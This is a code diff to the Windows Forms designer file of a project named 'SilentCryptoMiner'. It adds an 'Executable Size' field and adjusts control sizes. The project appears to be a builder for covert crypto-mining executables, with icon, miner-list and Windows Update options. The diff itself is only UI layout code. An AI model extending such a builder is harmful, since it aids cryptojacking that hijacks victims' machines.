@@ -89,6 +89,9 @@ namespace SilentCryptoMiner
             this.btnBrowseIcon = new MephButton();
             this.txtIconPath = new MephTextBox();
             this.tabOptions = new System.Windows.Forms.TabPage();
+            this.label2 = new System.Windows.Forms.Label();
+            this.label3 = new System.Windows.Forms.Label();
+            this.txtExeSize = new MephTextBox();
             this.cFormAO = new MephListBox();
             this.btnAdvancedOptions = new MephButton();
             this.pictureBox3 = new System.Windows.Forms.PictureBox();
@@ -252,7 +255,7 @@ namespace SilentCryptoMiner
             this.listMiners.ItemHeight = 17;
             this.listMiners.Location = new System.Drawing.Point(15, 31);
             this.listMiners.Name = "listMiners";
-            this.listMiners.Size = new System.Drawing.Size(392, 72);
+            this.listMiners.Size = new System.Drawing.Size(392, 64);
             this.listMiners.TabIndex = 47;
             // 
             // btnMinerRemove
@@ -841,6 +844,9 @@ namespace SilentCryptoMiner
             // tabOptions
             // 
             this.tabOptions.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
+            this.tabOptions.Controls.Add(this.label2);
+            this.tabOptions.Controls.Add(this.label3);
+            this.tabOptions.Controls.Add(this.txtExeSize);
             this.tabOptions.Controls.Add(this.cFormAO);
             this.tabOptions.Controls.Add(this.btnAdvancedOptions);
             this.tabOptions.Controls.Add(this.pictureBox3);
@@ -867,6 +873,44 @@ namespace SilentCryptoMiner
             this.tabOptions.TabIndex = 5;
             this.tabOptions.Text = "Options";
             // 
+            // label2
+            // 
+            this.label2.AutoSize = true;
+            this.label2.Font = new System.Drawing.Font("Segoe UI", 9.5F);
+            this.label2.Location = new System.Drawing.Point(204, 123);
+            this.label2.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
+            this.label2.Name = "label2";
+            this.label2.Size = new System.Drawing.Size(27, 17);
+            this.label2.TabIndex = 144;
+            this.label2.Text = "mb";
+            // 
+            // label3
+            // 
+            this.label3.AutoSize = true;
+            this.label3.Font = new System.Drawing.Font("Segoe UI", 9.5F);
+            this.label3.Location = new System.Drawing.Point(17, 123);
+            this.label3.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
+            this.label3.Name = "label3";
+            this.label3.Size = new System.Drawing.Size(146, 17);
+            this.label3.TabIndex = 143;
+            this.label3.Text = "Executable Size (about):";
+            // 
+            // txtExeSize
+            // 
+            this.txtExeSize.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
+            this.txtExeSize.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.txtExeSize.ForeColor = System.Drawing.Color.Silver;
+            this.txtExeSize.Location = new System.Drawing.Point(168, 121);
+            this.txtExeSize.MaxLength = 32767;
+            this.txtExeSize.MultiLine = false;
+            this.txtExeSize.Name = "txtExeSize";
+            this.txtExeSize.Size = new System.Drawing.Size(34, 24);
+            this.txtExeSize.TabIndex = 142;
+            this.txtExeSize.Text = "0";
+            this.txtExeSize.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
+            this.txtExeSize.UseSystemPasswordChar = false;
+            this.txtExeSize.WordWrap = false;
+            // 
             // cFormAO
             // 
             this.cFormAO.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
@@ -875,7 +919,7 @@ namespace SilentCryptoMiner
             this.cFormAO.ItemHeight = 17;
             this.cFormAO.Location = new System.Drawing.Point(138, 161);
             this.cFormAO.Name = "cFormAO";
-            this.cFormAO.Size = new System.Drawing.Size(10, 18);
+            this.cFormAO.Size = new System.Drawing.Size(10, 16);
             this.cFormAO.TabIndex = 141;
             this.cFormAO.Visible = false;
             // 
@@ -1327,5 +1371,8 @@ namespace SilentCryptoMiner
         internal MephToggleSwitch toggleWindowsUpdate;
         internal MephButton btnAdvancedOptions;
         internal MephListBox cFormAO;
+        internal Label label2;
+        internal Label label3;
+        internal MephTextBox txtExeSize;
     }
 }
